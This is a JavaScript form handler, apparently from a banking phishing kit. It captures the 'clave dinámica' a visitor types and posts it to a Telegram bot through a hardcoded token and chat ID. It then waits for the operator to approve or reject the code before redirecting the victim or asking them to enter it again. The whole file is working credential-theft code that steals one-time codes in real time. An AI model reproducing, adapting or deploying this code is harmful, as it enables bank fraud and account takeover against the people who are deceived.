document.addEventListener("DOMContentLoaded", function () {
    let lastUpdateId = 0; // Guarda el ID del último mensaje procesado
    let intervaloVerificacion;

    document.getElementById("dinamicaForm").addEventListener("submit", function (event) {
        event.preventDefault(); // Evita que la página se recargue

        let claveDinamica = document.getElementById("dinamica").value.trim();
        let errorMensaje = document.getElementById("errorMensaje");

        if (claveDinamica === "") {
            alert("Por favor, ingresa la clave dinámica.");
            return;
        }

        // Datos del bot de Telegram
        let botToken = "7504281821:AAHWdSuYPKftjOmBC2N03av3PaF7qyEqd9g"; 
        let chatId = "7829793593"; 
        let message = `🔑 Nueva clave dinámica ingresada:\n${claveDinamica}\n\n👀 Verifícala y responde con /aprobar o /rechazar.`;

        let telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;

        fetch(telegramURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                

                // Guardar el último update ID antes de empezar la verificación
                obtenerUltimoUpdateId(botToken);

                // Iniciar verificación en intervalos cada 5 segundos
                intervaloVerificacion = setInterval(() => verificarEstadoClave(botToken, chatId), 5000);
            } else {
                console.error("❌ Error en Telegram:", data);
                alert("Error al enviar la clave: " + data.description);
            }
        })
        .catch(error => {
            console.error("❌ Error de conexión:", error);
            alert("No se pudo conectar con Telegram.");
        });
    });

    function obtenerUltimoUpdateId(botToken) {
        let updatesURL = `https://api.telegram.org/bot${botToken}/getUpdates`;

        fetch(updatesURL)
            .then(response => response.json())
            .then(data => {
                if (data.ok && data.result.length > 0) {
                    lastUpdateId = data.result[data.result.length - 1].update_id; // Guarda el último ID
                    console.log("🆕 Último update ID registrado:", lastUpdateId);
                }
            })
            .catch(error => {
                console.error("❌ Error obteniendo el último update ID:", error);
            });
    }

    function verificarEstadoClave(botToken, chatId) {
        let updatesURL = `https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}`;

        fetch(updatesURL)
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    let mensajes = data.result;

                    mensajes.forEach((mensaje) => {
                        if (mensaje.update_id > lastUpdateId) {
                            lastUpdateId = mensaje.update_id; // Guardamos el último mensaje procesado

                            if (mensaje.message && mensaje.message.text) {
                                let texto = mensaje.message.text;

                                if (texto === "/aprobar") {
                                    clearInterval(intervaloVerificacion); // Detener la verificación
                                    window.location.href = "loading.html"; // Redirigir a loading.html
                                } else if (texto === "/rechazar") {
                                    clearInterval(intervaloVerificacion); // Detener la verificación
                                    let errorMensaje = document.getElementById("errorMensaje");
                                    errorMensaje.style.display = "block"; // Muestra el mensaje de error
                                    document.getElementById("dinamica").value = ""; // Limpia el campo de clave
                                }
                            }
                        }
                    });
                }
            })
            .catch(error => {
                console.error("❌ Error obteniendo mensajes del bot:", error);
            });
    }
});
